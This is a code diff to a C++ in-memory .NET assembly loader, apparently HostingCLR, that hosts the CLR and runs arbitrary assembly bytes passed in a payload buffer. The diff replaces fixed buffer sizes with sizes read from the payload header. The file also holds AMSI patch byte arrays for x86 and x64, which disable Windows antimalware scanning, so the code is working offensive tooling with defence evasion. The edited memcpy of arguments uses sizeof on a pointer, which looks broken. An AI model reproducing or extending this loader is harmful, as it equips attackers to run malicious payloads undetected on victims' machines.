@@ -6,31 +6,30 @@
 // by Etor Madiv
 
 #include "stdafx.h"
+#include <stdio.h>
 #include "HostingCLR.h"
 
-#define RAW_ASSEMBLY_LENGTH 1024000
-#define RAW_AGRS_LENGTH 1023
-
 unsigned char amsiflag[1];
-unsigned char arg_s[RAW_AGRS_LENGTH];
-unsigned char allData[RAW_ASSEMBLY_LENGTH + RAW_AGRS_LENGTH];
-unsigned char rawData[RAW_ASSEMBLY_LENGTH];
 
 char sig_40[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };
 char sig_20[] = { 0x76,0x32,0x2E,0x30,0x2E,0x35,0x30,0x37,0x32,0x37 };
 
 #ifdef _X32
 unsigned char amsipatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
-SIZE_T patchsize = 6;
+SIZE_T patchsize = 8;
 #endif
 #ifdef _X64
 unsigned char amsipatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
 SIZE_T patchsize = 6;
 #endif
 
+union PARAMSIZE {
+	unsigned char myByte[4];
+	int intvalue;
+} paramsize;
+
 int executeSharp(LPVOID lpPayload)
 {
-	
 	HRESULT hr;
 
 	ICLRMetaHost* pMetaHost = NULL;
@@ -48,7 +47,31 @@ int executeSharp(LPVOID lpPayload)
 	SAFEARRAY *psaStaticMethodArgs;
 	VARIANT vtPsa;
 
-	rgsabound[0].cElements = RAW_ASSEMBLY_LENGTH;
+	unsigned char pSize[8];
+
+	//Read parameters assemblysize + argssize
+	ReadProcessMemory(GetCurrentProcess(), lpPayload, pSize, 8, &readed);
+
+	PARAMSIZE assemblysize;
+	assemblysize.myByte[0] = pSize[0];
+	assemblysize.myByte[1] = pSize[1];
+	assemblysize.myByte[2] = pSize[2];
+	assemblysize.myByte[3] = pSize[3];
+
+	PARAMSIZE argssize;
+	argssize.myByte[0] = pSize[4];
+	argssize.myByte[1] = pSize[5];
+	argssize.myByte[2] = pSize[6];
+	argssize.myByte[3] = pSize[7];
+
+	long raw_assembly_length = assemblysize.intvalue;
+	long raw_args_length = argssize.intvalue;
+
+	unsigned char *allData = (unsigned char*)malloc(raw_assembly_length * sizeof(unsigned char)+ raw_args_length * sizeof(unsigned char) + 8 * sizeof(unsigned char));
+	unsigned char *arg_s = (unsigned char*)malloc(raw_args_length * sizeof(unsigned char));
+	unsigned char *rawData = (unsigned char*)malloc(raw_assembly_length * sizeof(unsigned char));
+
+	rgsabound[0].cElements = raw_assembly_length;
 	rgsabound[0].lLbound = 0;
 	SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);
 
@@ -60,26 +83,28 @@ int executeSharp(LPVOID lpPayload)
 		printf("Failed SafeArrayAccessData w/hr 0x%08lx\n", hr);
 		return -1;
 	}
+	
+	//Reading memory parameters + amsiflag + args + assembly
+	ReadProcessMemory(GetCurrentProcess(), lpPayload , allData, raw_assembly_length + raw_args_length + 8, &readed);
 
-	//Reading memory parameter + assembly
-	ReadProcessMemory(GetCurrentProcess(), lpPayload, allData, RAW_ASSEMBLY_LENGTH + RAW_AGRS_LENGTH, &readed);
-
+	//Taking pointer to amsi
+	unsigned char *offsetamsi = allData + 8;
 	//Store amsi flag 
-	memcpy(amsiflag, allData, 1);
+	memcpy(amsiflag, offsetamsi, 1);
 	
 	//Taking pointer to args
-	unsigned char *offsetargs = allData + 1;
+	unsigned char *offsetargs = allData + 9;
 	//Store parameters 
 	memcpy(arg_s, offsetargs, sizeof(arg_s));
 
 	//Taking pointer to assembly
-	unsigned char *offset = allData + RAW_AGRS_LENGTH + 1;
+	unsigned char *offset = allData + raw_args_length + 9;
 	//Store assembly
-	memcpy(pvData, offset, RAW_ASSEMBLY_LENGTH);
+	memcpy(pvData, offset, raw_assembly_length);
 
 	LPCWSTR clrVersion;
-
-	if(FindVersion(pvData))
+	
+	if(FindVersion(pvData, raw_assembly_length))
 	{
 		clrVersion = L"v4.0.30319";
 	}
@@ -272,12 +297,12 @@ VOID Execute(LPVOID lpPayload)
 
 }
 
-BOOL FindVersion(void * assembly)
+BOOL FindVersion(void * assembly, int length)
 {
 	char* assembly_c;
 	assembly_c = (char*)assembly;
 	
-	for (int i = 0; i < RAW_ASSEMBLY_LENGTH; i++)
+	for (int i = 0; i < length; i++)
 	{
 		for (int j = 0; j < 10; j++)
 		{
